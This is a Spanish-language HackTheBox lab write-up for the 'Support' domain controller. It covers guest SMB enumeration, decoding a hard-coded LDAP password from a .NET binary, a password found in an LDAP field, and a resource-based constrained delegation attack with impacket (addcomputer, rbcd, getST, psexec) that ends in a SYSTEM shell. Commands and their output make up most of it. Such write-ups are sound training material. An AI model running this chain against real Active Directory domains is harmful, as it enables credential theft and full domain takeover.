Propiedades:
- OS: Windows
- Plataforma: HackTheBox
- Nivel: Easy
- Tags: #psexec #rbcd #resource-based #ad #acl #bloodhound #rusthound #impacket #ldap

![](assets/Pasted%20image%2020260122195147.png)
## Reconocimiento

Comienzo con un ping para comprobar la conectividad.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/support]
└─$ ping -c 1 10.129.230.181
PING 10.129.230.181 (10.129.230.181) 56(84) bytes of data.
64 bytes from 10.129.230.181: icmp_seq=1 ttl=127 time=126 ms

--- 10.129.230.181 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 125.734/125.734/125.734/0.000 ms
```

Ahora tiro un escaneo con nmap para ver que puertos tenemos abiertos.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/support]
└─$ sudo nmap -p- -Pn -n -sS --min-rate 5000 -vvv 10.129.230.181 -oG nmap/allPorts

PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49676/tcp open  unknown          syn-ack ttl 127
49688/tcp open  unknown          syn-ack ttl 127
49701/tcp open  unknown          syn-ack ttl 127
```

Sobre los puertos abiertos realizo un segundo escaneo para detectar servicios, versiones y correr un conjunto de scripts de reconocimiento.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/support]
└─$ sudo nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49667,49676,49688,49701 -sV -sC -Pn -n -sS -vvv 10.129.230.181 -oN nmap/target

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-01-23 01:54:43Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49676/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49688/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49701/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-01-23T01:55:38
|_  start_date: N/A
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 17243/tcp): CLEAN (Timeout)
|   Check 2 (port 40729/tcp): CLEAN (Timeout)
|   Check 3 (port 26300/udp): CLEAN (Timeout)
|   Check 4 (port 6187/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: -4s
```

Por la información que tengo puedo intuir que estoy contra un `DC`.

- Puerto 88 Kerberos
- Puerto 135 RPC.
- Puerto 139, 445 SMB.
- Puerto 389, 636 LDAP.
- Puerto 5985 WinRm.

## Enumeración

### Puerto 445 SMB.

Saque información general de la maquina:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/support]
└─$ nxc smb 10.129.230.181
SMB         10.129.230.181  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
```

- Dominio **support.htb** y nombre de la maquina `DC`.

Voy a colocarlo en el `/etc/hosts`

```bash
10.129.230.181 support.htb DC.support.htb DC
```

Puedo tratar de enumerar los shares a los que tengo acceso como **guest**:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/support]
└─$ nxc smb support.htb -u 'guest' -p '' --shares
SMB         10.129.230.181  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
SMB         10.129.230.181  445    DC               [+] support.htb\guest:
SMB         10.129.230.181  445    DC               [*] Enumerated shares
SMB         10.129.230.181  445    DC               Share           Permissions     Remark
SMB         10.129.230.181  445    DC               -----           -----------     ------
SMB         10.129.230.181  445    DC               ADMIN$                          Remote Admin
SMB         10.129.230.181  445    DC               C$                              Default share
SMB         10.129.230.181  445    DC               IPC$            READ            Remote IPC
SMB         10.129.230.181  445    DC               NETLOGON                        Logon server share
SMB         10.129.230.181  445    DC               support-tools   READ            support staff tools
SMB         10.129.230.181  445    DC               SYSVOL                          Logon server share
```

- Tengo permiso de lectura en el recurso no estándar **support-tools**.

También puedo tratar de enumerar usuario vía rid bruteforce.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/support]
└─$ nxc smb support.htb -u 'guest' -p '' --rid-brute | grep "SidTypeUser"
SMB                      10.129.230.181  445    DC               500: SUPPORT\Administrator (SidTypeUser)
SMB                      10.129.230.181  445    DC               501: SUPPORT\Guest (SidTypeUser)
SMB                      10.129.230.181  445    DC               502: SUPPORT\krbtgt (SidTypeUser)
SMB                      10.129.230.181  445    DC               1000: SUPPORT\DC$ (SidTypeUser)
SMB                      10.129.230.181  445    DC               1104: SUPPORT\ldap (SidTypeUser)
SMB                      10.129.230.181  445    DC               1105: SUPPORT\support (SidTypeUser)
SMB                      10.129.230.181  445    DC               1106: SUPPORT\smith.rosario (SidTypeUser)
SMB                      10.129.230.181  445    DC               1107: SUPPORT\hernandez.stanley (SidTypeUser)
SMB                      10.129.230.181  445    DC               1108: SUPPORT\wilson.shelby (SidTypeUser)
SMB                      10.129.230.181  445    DC               1109: SUPPORT\anderson.damian (SidTypeUser)
SMB                      10.129.230.181  445    DC               1110: SUPPORT\thomas.raphael (SidTypeUser)
SMB                      10.129.230.181  445    DC               1111: SUPPORT\levine.leopoldo (SidTypeUser)
SMB                      10.129.230.181  445    DC               1112: SUPPORT\raven.clifton (SidTypeUser)
SMB                      10.129.230.181  445    DC               1113: SUPPORT\bardot.mary (SidTypeUser)
SMB                      10.129.230.181  445    DC               1114: SUPPORT\cromwell.gerard (SidTypeUser)
SMB                      10.129.230.181  445    DC               1115: SUPPORT\monroe.david (SidTypeUser)
SMB                      10.129.230.181  445    DC               1116: SUPPORT\west.laura (SidTypeUser)
SMB                      10.129.230.181  445    DC               1117: SUPPORT\langley.lucy (SidTypeUser)
SMB                      10.129.230.181  445    DC               1118: SUPPORT\daughtler.mabel (SidTypeUser)
SMB                      10.129.230.181  445    DC               1119: SUPPORT\stoll.rachelle (SidTypeUser)
SMB                      10.129.230.181  445    DC               1120: SUPPORT\ford.victoria (SidTypeUser)
```

Al conectarme al recurso **support-tools** puedo ver una gran variedad de binarios y zips.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/support]
└─$ smbclient //10.129.230.181/support-tools -U guest --option='client min protocol=NT1'

Password for [WORKGROUP\guest]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jul 20 17:01:06 2022
  ..                                  D        0  Sat May 28 11:18:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 11:19:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 11:19:55 2022
  putty.exe                           A  1273576  Sat May 28 11:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 11:19:31 2022
  UserInfo.exe.zip                    A   277499  Wed Jul 20 17:01:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 11:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 11:19:43 2022

                4026367 blocks of size 4096. 959423 blocks available
smb: \> get npp.8.4.1.portable.x64.zip
getting file \npp.8.4.1.portable.x64.zip of size 5439245 as npp.8.4.1.portable.x64.zip (1810.4 KiloBytes/sec) (average 1810.4 KiloBytes/sec)
smb: \> get SysinternalsSuite.zip

getting file \SysinternalsSuite.zip of size 48102161 as SysinternalsSuite.zip (2981.8 KiloBytes/sec) (average 2797.9 KiloBytes/sec)
smb: \>
smb: \> get UserInfo.exe.zip
getting file \UserInfo.exe.zip of size 277499 as UserInfo.exe.zip (232.6 KiloBytes/sec) (average 2647.3 KiloBytes/sec)
```

- Este recurso al parecer contiene una variedad de herramientas que el staff utiliza para administrar equipos y cuentas.
## Acceso Inicial.

Extraje el zip **UserInfo.exe.zip** y me encuentro con lo siguiente:

```bash
┌──(wndr㉿wndr)-[~/…/hackthebox/support/content/UserInfo]
└─$ tree
.
├── CommandLineParser.dll
├── Microsoft.Bcl.AsyncInterfaces.dll
├── Microsoft.Extensions.DependencyInjection.Abstractions.dll
├── Microsoft.Extensions.DependencyInjection.dll
├── Microsoft.Extensions.Logging.Abstractions.dll
├── System.Buffers.dll
├── System.Memory.dll
├── System.Numerics.Vectors.dll
├── System.Runtime.CompilerServices.Unsafe.dll
├── System.Threading.Tasks.Extensions.dll
├── UserInfo.exe
└── UserInfo.exe.config
```

- A simple vista no parecer nada raro, pero puedo tratar de aplicarle ingeniería inversa.

Abrí el binario **UsersInfo.exe** en DNSpy y puedo ver que el programa sirve para realizar consultas LDAP.

![](assets/Pasted%20image%2020260122203004.png)


El hecho de que realice consultas LDAP implica que en algún punto se están tramitando credenciales.

- Esto lo podemos ver en el método `LdapQuery()` donde se encuentra el usuario **ldap** y otro metodo llamado `getPassword()`.

![](assets/Pasted%20image%2020260122203219.png)

Al darle click al método de `getPassword()` soy llevado a esta otra parte del código donde se esta definiendo una clase interna y un método `getPassword()` que se encarga de ofuscar la contraseña

![](assets/Pasted%20image%2020260122204301.png)


Puedo copiarme la función y ejecutarla en Visual Studio 2022 para ver cual es la password.

```c#
using System.Text;

string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";
byte[] key = Encoding.ASCII.GetBytes("armando");

byte[] array = Convert.FromBase64String(enc_password);
byte[] array2 = array;
for (int i = 0; i < array.Length; i++)
{
    array2[i] = (byte)(array[i] ^ key[i % key.Length] ^ 223);
}
Console.WriteLine(Encoding.Default.GetString(array2));
```

![](assets/Pasted%20image%2020260122204227.png)

La contraseña es `nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`

Se que la contraseña es del usuario **ldap** por lo cual lo podemos probar en distintos servicios.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/support]
└─$ nxc ldap support.htb -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
LDAP        10.129.230.181  389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:support.htb)
LDAP        10.129.230.181  389    DC               [+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz

┌──(wndr㉿wndr)-[~/Machines/hackthebox/support]
└─$ nxc smb support.htb -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
SMB         10.129.230.181  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
SMB         10.129.230.181  445    DC               [+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

Otra cosa que puedo hacer es enumerar LDAP utilizando mis credenciales.

- Esto me listara toda la información del dominio a la que tengo acceso.

```bash
┌──(wndr㉿wndr)-[~/Tools]
└─$ ldapsearch \
  -x \
  -H ldap://support.htb \
  -D 'ldap@support.htb' \
  -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
  -b "DC=support,DC=htb"

# support, Users, support.htb
dn: CN=support,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: support
c: US
l: Chapel Hill
st: NC
postalCode: 27514
distinguishedName: CN=support,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528111200.0Z
whenChanged: 20220528111201.0Z
uSNCreated: 12617
info: Ironside47pleasure40Watchful
memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
uSNChanged: 12630
company: support
streetAddress: Skipper Bowles Dr
name: support
objectGUID:: CqM5MfoxMEWepIBTs5an8Q==
userAccountControl: 66048
badPwdCount: 1
codePage: 0
countryCode: 0
badPasswordTime: 134136099958429512
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132982099209777070
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEILUQQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: support
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=support,DC=htb
dSCorePropagationData: 20220528111201.0Z
dSCorePropagationData: 16010101000000.0Z
```

- Podemos ver que el usuario support tiene un campo info: Ironside47pleasure40Watchful.

El campo info luce como una contraseña por lo cual podemos probarla

```bash
┌──(wndr㉿wndr)-[~/Tools]
└─$ nxc smb support.htb -u support -p 'Ironside47pleasure40Watchful'
SMB         10.129.230.181  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
SMB         10.129.230.181  445    DC               [+] support.htb\support:Ironside47pleasure40Watchful

┌──(wndr㉿wndr)-[~/Tools]
└─$ nxc winrm support.htb -u support -p 'Ironside47pleasure40Watchful'
WINRM       10.129.230.181  5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:support.htb)
WINRM       10.129.230.181  5985   DC               [+] support.htb\support:Ironside47pleasure40Watchful (Pwn3d!)
```

- Las credenciales sirven para los servicios SMB y WinRm.


Me puedo conectar por WinRm para obtener acceso:

```bash
┌──(wndr㉿wndr)-[~/Tools]
└─$ evil-winrm -i support.htb -u support -p 'Ironside47pleasure40Watchful'

*Evil-WinRM* PS C:\Users\support\Documents> whoami
support\support
*Evil-WinRM* PS C:\Users\support> cd Desktop
*Evil-WinRM* PS C:\Users\support\Desktop> ls


    Directory: C:\Users\support\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         1/22/2026   5:51 PM             34 user.txt


*Evil-WinRM* PS C:\Users\support\Desktop> type user.txt
a6af02a9a27f16a98a9****
```

## Escalada de Privilegios con Bloodhound.

Ahora que tengo credenciales puedo utilizar `bloodhound` para enumerar el dominio.

- **BloodHound** es una herramienta de **enumeración y análisis de Active Directory** que usa **grafos** para identificar **relaciones de confianza, permisos y rutas de escalada de privilegios** entre usuarios, grupos y equipos dentro de un dominio.

Para esto primero tengo que utilizar un **ingestor** que se va a encargar de recopilar toda la informacion del dominio. Yo utilice [rusthound](https://github.com/g0h4n/RustHound-CE)

```bash
┌──(wndr㉿wndr)-[~/Tools/RustHound-CE]
└─$ ./rusthound-ce -d support.htb -u ldap@support.htb -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -z
---------------------------------------------------
Initializing RustHound-CE at 02:50:48 on 01/23/26
Powered by @g0h4n_0
---------------------------------------------------

[2026-01-23T02:50:48Z INFO  rusthound_ce] Verbosity level: Info
[2026-01-23T02:50:48Z INFO  rusthound_ce] Collection method: All
[2026-01-23T02:50:48Z INFO  rusthound_ce::ldap] Connected to SUPPORT.HTB Active Directory!
[2026-01-23T02:50:48Z INFO  rusthound_ce::ldap] Starting data collection...
[2026-01-23T02:50:48Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-01-23T02:50:52Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=support,DC=htb
[2026-01-23T02:50:52Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-01-23T02:50:56Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Configuration,DC=support,DC=htb
[2026-01-23T02:50:56Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-01-23T02:50:59Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Schema,CN=Configuration,DC=support,DC=htb
[2026-01-23T02:50:59Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-01-23T02:50:59Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=DomainDnsZones,DC=support,DC=htb
[2026-01-23T02:50:59Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-01-23T02:51:00Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=ForestDnsZones,DC=support,DC=htb
[2026-01-23T02:51:00Z INFO  rusthound_ce::api] Starting the LDAP objects parsing...
[2026-01-23T02:51:00Z INFO  rusthound_ce::objects::domain] MachineAccountQuota: 10
[2026-01-23T02:51:00Z INFO  rusthound_ce::api] Parsing LDAP objects finished!
[2026-01-23T02:51:00Z INFO  rusthound_ce::json::checker] Starting checker to replace some values...
[2026-01-23T02:51:00Z INFO  rusthound_ce::json::checker] Checking and replacing some values finished!
[2026-01-23T02:51:00Z INFO  rusthound_ce::json::maker::common] 21 users parsed!
[2026-01-23T02:51:00Z INFO  rusthound_ce::json::maker::common] 61 groups parsed!
[2026-01-23T02:51:00Z INFO  rusthound_ce::json::maker::common] 1 computers parsed!
[2026-01-23T02:51:00Z INFO  rusthound_ce::json::maker::common] 1 ous parsed!
[2026-01-23T02:51:00Z INFO  rusthound_ce::json::maker::common] 1 domains parsed!
[2026-01-23T02:51:00Z INFO  rusthound_ce::json::maker::common] 2 gpos parsed!
[2026-01-23T02:51:00Z INFO  rusthound_ce::json::maker::common] 73 containers parsed!
[2026-01-23T02:51:00Z INFO  rusthound_ce::json::maker::common] .//20260123025100_support-htb_rusthound-ce.zip created!

RustHound-CE Enumeration Completed at 02:51:00 on 01/23/26! Happy Graphing!
```

- Esto nos genera un zip, que podemos importar en Bloodhound.

### GenericAll sobre DC.SUPPORT.HTB

Lo primero que veo es lo siguiente:

- Nuestro usuario support pertenece al grupo **Shared Support Accounts** y tiene el permiso **GenericAll** sobre la cuenta maquina del **DC**.

![](assets/Pasted%20image%2020260122211102.png)

Podemos abusar de GenericAll realizando un Resource-Based Constrained Delegation (RBCD).

- La delegación de servicios en Active Directory es básicamente darle permisos a una cuenta para que actúe como "otra", es decir que puede "suplantar" usuarios.

Primero necesito agregar una cuenta maquina al dominio.

- Esta va a ser la maquina que va a poder "suplantar" usuarios.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/support]
└─$ impacket-addcomputer -method SAMR -computer-name 'ATTACKERSYSTEM$' -computer-pass 'wndr2018!' -dc-host 10.129.230.181 -domain-netbios support.htb 'support.htb/support:Ironside47pleasure40Watchful'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Successfully added machine account ATTACKERSYSTEM$ with password wndr2018!.
```

Ahora tengo que hacer que la cuenta maquina DC$ confié en mi cuenta **ATTACKERSYSTEM$**.

- Esto se hace modificando el atributo `msDS-AllowedToActOnBehalfOfOtherIdentity`

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/support]
└─$ impacket-rbcd -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'DC$' -action 'write' 'support.htb/support:Ironside47pleasure40Watchful'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] ATTACKERSYSTEM$ can now impersonate users on DC$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     ATTACKERSYSTEM$   (S-1-5-21-1677581083-3380853377-188903654-6101)
```

Ahora que mi cuenta **ATTACKERSYSTEM$** tiene el permiso de actuar en nombre de otros usuarios puedo pedir un TGS para el SMB actuando como el usuario administrador:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/support]
└─$ python3 getST.py -spn 'cifs/dc.support.htb' -impersonate 'administrator' 'support.htb/attackersystem$:wndr2018!'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
```

Este TGS lo puedo usar para conseguir una shell via `psexec`.

- Primero establezco la variable `KRB5CCNAME` para autenticarme via Kerberos.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/support]
└─$ export KRB5CCNAME=administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
```

Y ahora con `imapcket-psexec` consigo una shell:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/support]
└─$ impacket-psexec support.htb/Administrator@dc.support.htb -k -no-pass
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Requesting shares on dc.support.htb.....
[*] Found writable share ADMIN$
[*] Uploading file yujiIEsJ.exe
[*] Opening SVCManager on dc.support.htb.....
[*] Creating service rvpa on dc.support.htb.....
[*] Starting service rvpa.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.859]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
C:\Users\Administrator\Desktop> type root.txt
ec34018b49b7b01ff30****
```

***PWNED*** 

![](assets/Pasted%20image%2020260126202848.png)